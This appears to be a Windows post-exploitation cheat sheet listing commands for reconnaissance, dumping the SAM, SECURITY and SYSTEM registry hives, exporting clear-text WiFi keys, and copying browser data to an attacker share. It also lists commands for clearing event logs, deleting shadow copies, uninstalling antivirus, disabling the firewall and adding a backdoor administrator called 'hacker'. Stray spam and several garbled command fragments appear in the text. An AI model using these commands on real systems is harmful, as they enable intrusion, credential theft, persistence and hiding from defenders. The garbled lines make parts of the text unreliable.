#############################
#Still needs to be scripted.#
#############################

#system
whoami
whoami /all
set

fsutil fsinfo drives
reg query HKLM /s /d /f "C:\* *.exe" | find /I "C:\" | find /V """"

#networking
ipconfig /all
ipconfig /displaydns
netstat -nabo
netstat -r
netstat -na | findstr :445
netstat -nao | findstr LISTENING
netstat -anob | findstr "services, process or port"
netsh diag show all
net view
net view /domain
net view /domain:otherdomain

net user %USERNAME% /domain
net user /domain
net accounts
net accounts /domain
net localgroup administrators
net group "Domain Admins" /domain

net group "Enterprise Admins" /domain
net group "Domain Controllers" r/domain
net share
net session | find / "\\"
arp -a
route print
browstat
netsh wlprofiles show profiles
netsh wlan export profile folder=. key=clear
netsh w`lan [start|stop] hostednetwork
netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent|temporary
netsh wlan set hostednetwork mode=[allow|disallow]
wmic ntdomain list

#configs
gpresult /z
sc qc <servicename>
sc query
sc queryex
type %WINDIR%\System32\drivers\etc\hosts
echo %COMSPEC%
c:\windows\system32\gathernetworkinfo.vbs

#finding important files
tree C:\ /f /a > C:\output_of_tree.txt
dir /a
dir /b /s [Directory or Filename]
dir \ /s /b | find /I "searchstring"
dir \ /s /b | find /I "mike"
command | find /c /v ""

#files to pull (if possible)
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\iis6.log (5, 6 or 7)
%WINDIR%\system32\logfiles\httperr\httperr1.log
%SystemDrive%\inetpub\logs\LogFiles
%WINDIR%\system32\logfiles\w3svc1\exYYMMDD.log (year month day)
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\SysEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
unattend.txt, unattend.xml, sysprep.inf

#remote system access
net share \\computername
tasklist /V /S computername
qwinsta /SERVER:computername
qprocess /SERVER:computername *
net use \\computername
net use \\computername /user:DOMAIN\username password
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f

#autostart dirs
%SystemDrive%\ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\

%SystemDrive%\Documents And Settings\All Users\Start Menu\Programs\StartUp\
%SystemDrive%\wmiOWS\Start Menu\Programs\StartUp\
%SystemDrive%\WINNT\Profiles\All Users\Start Menu\Programs\StartUp\

#Persistence
WMI
wmic bios
wmic qfe qfe get hotfixid
 (This gets patches IDs)
wmic startupwmic service
wmic process get caption,executablepath,commandline
wmic process call create "process_name" (executes a program)
wmic process where name="process_name" call terminate (terminates program)
wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber (hard drive information)
wmic useraccount (usernames, sid, and various security related goodies)
wmic useraccount get /ALL
wmic share get /ALL (you can use ? for gets help ! )
wmic startup list full (this can be a huge list!!!)
wmic /node:"hostname" bios get serialnumber (this can be great for finding warranty info about target)WE PRESENT YOU PORNHUB.COM
Reg Command exit
reg save HKLM\Security security.hive  (Save security hive to a file)
reg save HKLM\System system.hive (Save system hive to a file)
reg save HKLM\SAM sam.hive (Save sam to a file)=
reg add [\\TargetIPaddr\] [RegDomain][ \Key ]
reg export [RegDomain]\[Key] [FileName]
reg import [FileName ]
reg query [\\TargetIPaddr\] [RegDomain]\[ Key ] /v [Valuename!] (you can to add /s for recurse all values )

rem Deleting Logs
wevtutil el  (list logs)
wevtutil cl <LogName> (Clear specific lowbadming)
del %WINDIR%\*.log /a /s /q /f

Uninstalling Software "AntiVirus" (Non interactive)
wmic product get name /value (this gets software names)
wmic product where name="XXX" call uninstall /nointeractive (this uninstalls software)

# Other  (to be sorted)
pkgmgr usefull  /iu :"Package"
pkgmgr usefull  /iu :"TelnetServer" (Install Telnet Service ...)
pkgmgr /iu:"TelnetClient" (Client )
rundll32.exe user32.dll, LockWorkStation (locks the screen -invasive-)
wscript.exe <script js/vbs> - Invasive - may create message boxes-invasive-
cscript.exe <script js/vbs/c#>
xcopy /C /S %appdata%\Mozilla\Firefox\Profiles\*.sqlite \\your_box\firefox_funstuff
OS SPECIFICwmicWin2k3
winpop stat domainname
vssadmin.exe delete shadows /all /quiet (delete’s shadow copies for cleanup)

rem Vista/7
winstat features
wbadmin get status
wbadmin get items
gpresult /H gpols.htm
bcdedit /export <filename>

rem Vista SP1/7/2008/2008R2 (x86 & x64)

Enable/Disable Windows features with Deployment Image Servicing and Management (DISM):
*Note* Works well after bypassuac + getsystem (requires system privileges)
*Note2* For Dism.exe to work on x64 systems, the long commands are necessary

To list features which can be enabled/disabled:
%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /get-features

To enable a feature (TFTP client for example):
%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /enable-feature /featurename:TFTP

To disable a feature (again TFTP client):
%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /disable-feature /featurename:TFTP

Invasive or Altering Commands

Command
Description
net user hacker hacker /add
Creates a new local (to the victim) user called ‘hacker’ with the password of ‘hacker’
net localgroup administrators /add hacker
or
net localgroup administrators hacker /add
Adds the new user ‘hacker’ to the local administrators group
net share nothing$=C:\ /grant:hacker,FULL /unlimited
Shares the C drive (you can specify any drive) out as a Windows share and grants the user ‘hacker’ full rights to access, or modify anything on that drive.

One thing to note is that in newer (will have to look up exactly when, I believe since XP SP2) windows versions, share permissions and file permissions are separated. Since we added ournetsh selves as a local admin this isn’t a problem but it is something to keep in mind
net user username /active:yes /domain
Changes an inactive / disabled account to active. This can useful for re-enabling old domain admins to use, but still puts up a red flag if those accounts are being watched.
netsh firewall set opmode disable
Disables the local windows firewall
netsh firewall set opmode enable
Enables the local windows firewall. If rules are not in place for your connection, this could cause you to loose it.

